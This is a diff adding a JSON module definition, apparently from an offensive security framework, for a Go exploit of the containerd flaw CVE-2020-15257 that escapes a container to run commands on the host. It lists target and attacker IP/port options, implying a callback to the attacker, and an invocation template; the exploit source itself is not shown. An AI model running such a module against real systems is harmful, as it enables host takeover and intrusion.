@@ -1,0 +1,61 @@
+{
+    "base": {
+        "name": "CVE-2020-15257",
+        "type": "standard",
+        "author": [
+            "Kaitao Qiu (Miles) (@KaitaoQiu)"
+        ],
+        "credits": [
+            ""
+        ],
+        "path": [
+            "linux",
+            "go",
+            "cve2020_15257.json"
+        ],
+        "platform": "linux",
+        "arch": "x64",
+        "lang": "Go",
+        "privilege": false,
+        "GoInterpreter": false,
+        "GoInterpreterProgress": true,
+        "notes": "",
+        "remote": "",
+        "local": [],
+        "options": [
+            {
+                "name": "targetIP",
+                "value": "",
+                "required": true,
+                "flag": "",
+                "description": "IP address of the target container"
+            },
+            {
+                "name": "targetPort",
+                "value": "",
+                "required": true,
+                "flag": "",
+                "description": "Port number of the target container"
+            },
+            {
+                "name": "attackerIP",
+                "value": "",
+                "required": true,
+                "flag": "",
+                "description": "IP address of the attacker's machine"
+            },
+            {
+                "name": "attackerPort",
+                "value": "",
+                "required": true,
+                "flag": "",
+                "description": "Port number on which the attacker's machine is listening"
+            }
+        ],
+        "description": "Exploit for the Containerd vulnerability (CVE-2020-15257) that allows container escape and execution of arbitrary commands on the host machine by leveraging the containerd-shim API exposure.",
+        "commands": [
+            "data/modules/sourcecode/go/CVE-2020-15257/main.go",
+            "mainfunc(\"{{targetIP}}\", \"{{targetPort}}\", \"{{attackerIP}}\", \"{{attackerPort}}\")"
+        ]
+    }
+}
